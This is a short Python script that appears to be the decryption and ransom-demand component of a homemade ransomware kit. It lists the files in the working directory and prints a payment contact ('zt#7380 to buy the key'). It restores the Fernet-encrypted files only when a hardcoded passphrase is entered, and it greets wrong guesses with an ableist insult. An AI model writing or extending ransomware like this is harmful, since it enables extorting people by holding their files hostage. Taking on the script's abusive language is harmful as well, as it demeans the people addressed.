import os
from cryptography.fernet import Fernet
from colorama import Fore

files = []

for file in os.listdir():
    if file == "ransomware test.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)



print(files)

with open("thekey.key", "rb" ) as key:
    secretkey = key.read()

secretphrase = "ilikepenis15"

print("zt#7380 to buy the key.")
user_phrase = input("Enter the secret phrase to decrypt your files: ")

if user_phrase == secretphrase:
        for file in files:
            with open(file, "rb") as thefile:
                 contents = thefile.read()
                 contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
             thefile.write(contents_decrypted)
            print("You're files have been restored\n")
else:
     print("wrong key retarded monkey LOL")
        